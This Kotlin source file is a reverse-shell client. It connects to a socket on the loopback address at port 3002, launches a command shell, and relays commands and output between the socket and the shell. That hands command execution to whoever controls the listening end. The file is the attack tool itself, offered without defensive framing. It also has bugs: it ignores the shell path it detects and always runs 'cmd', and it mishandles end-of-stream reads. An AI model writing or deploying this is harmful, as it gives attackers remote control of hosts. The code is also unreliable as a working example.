package com.melardev.shell

import java.io.*
import java.net.InetAddress
import java.net.Socket


fun main() {

    try {
        val shellPath = getShellPath()
        if (shellPath == null) {
            System.err.println("Could not locate the shell executable path")
            return
        }

        val socket = Socket(InetAddress.getLoopbackAddress(), 3002)
        val socketIs = socket.getInputStream()
        val socketOut = socket.getOutputStream()

        val pb = ProcessBuilder()
        // merge STDERR with STDOUT
        pb.redirectErrorStream(true)
        pb.redirectInput(ProcessBuilder.Redirect.PIPE)
        pb.redirectOutput(ProcessBuilder.Redirect.PIPE)

        val process = pb.command("cmd").start()
        val outputStream = process.outputStream
        val inputStream = process.inputStream

        readFromSocketWriteIntoProcessAsync(socketIs, outputStream)
        readFromProcessWriteIntoSocket(inputStream, socketOut)

    } catch (e: IOException) {
        e.printStackTrace()
    }

}

private fun readFromSocketWriteIntoProcessAsync(socketIs: InputStream, outputStream: OutputStream) {
    Thread {
        try {
            // Read from socket, write into process
            val writer = BufferedWriter(OutputStreamWriter(outputStream))
            val bufferSocket = ByteArray(1024)
            var numberOfBytesReadFromSocket: Int
            do {
                numberOfBytesReadFromSocket = socketIs.read(bufferSocket)
                outputStream.write(bufferSocket, 0, numberOfBytesReadFromSocket)

                if (bufferSocket.last() == '\n'.toByte())
                    writer.newLine()

                writer.flush() // Very important
            } while (numberOfBytesReadFromSocket != -1)

        } catch (e: IOException) {
            e.printStackTrace()
            try {
                socketIs.close()
            } catch (ex: IOException) {
                System.exit(1)
            }

            try {
                outputStream.close()
            } catch (ex: IOException) {
                System.exit(1)
            }
        }
    }.start()
}

@Throws(IOException::class)
private fun readFromProcessWriteIntoSocket(inputStream: InputStream, socketOut: OutputStream) {
    val buffer = ByteArray(1024)
    var numberOfBytesRead: Int

    do {
        numberOfBytesRead = inputStream.read(buffer)
        if (numberOfBytesRead <= 0)
            break

        socketOut.write(buffer, 0, numberOfBytesRead)
        socketOut.flush()
    } while (numberOfBytesRead != -1)

}

private fun getShellPath(): String? {
    val os = System.getProperty("os.name").toLowerCase()
    if (os.startsWith("windows"))
        return "cmd.exe"
    else {
        val shellLocations = arrayOf("/bin/bash", "/bin/sh", "/bin/csh", "/bin/ksh")
        for (shellLocation in shellLocations) {
            val shell = File(shellLocation)
            if (shell.exists())
                return shell.absolutePath
        }
    }
    return null
}
